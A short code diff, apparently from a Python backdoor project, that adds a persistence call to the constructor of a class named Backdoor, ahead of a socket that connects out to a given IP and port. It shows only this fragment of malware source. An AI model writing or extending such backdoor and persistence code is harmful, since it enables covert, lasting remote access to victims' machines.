@@ -9,6 +9,7 @@ import shutil
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistent()
         self.con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.con.connect((ip, port))
 
